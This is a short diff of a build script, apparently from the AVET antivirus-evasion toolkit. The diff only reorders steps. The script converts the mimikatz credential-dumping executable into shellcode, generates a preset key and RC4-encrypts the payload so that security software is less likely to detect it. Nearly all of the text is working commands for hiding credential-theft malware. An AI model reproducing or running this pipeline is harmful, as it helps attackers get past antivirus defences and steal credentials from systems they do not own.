@@ -24,22 +24,20 @@
 #CONFIGURATION_START
 # enable debug output
 enable_debug_print
-# convert mimikatz executable into shellcode format
-# Can be of course used with other .exe files
-wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/sc_raw.txt
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
+# generate key file with preset key
+generate_key preset aabbccdd1122 input/key_raw.txt
 #CONFIGURATION_END
 
 
 # print AVET logo
 cat banner.txt
 
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
-
-# generate key file with preset key
-generate_key preset aabbccdd1122 input/key_raw.txt
-
+# convert mimikatz executable into shellcode format
+# Can be of course used with other .exe files
+wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/sc_raw.txt
 # encrypt payload
 encode_payload rc4 input/sc_raw.txt input/sc_enc_raw.txt input/key_raw.txt
 
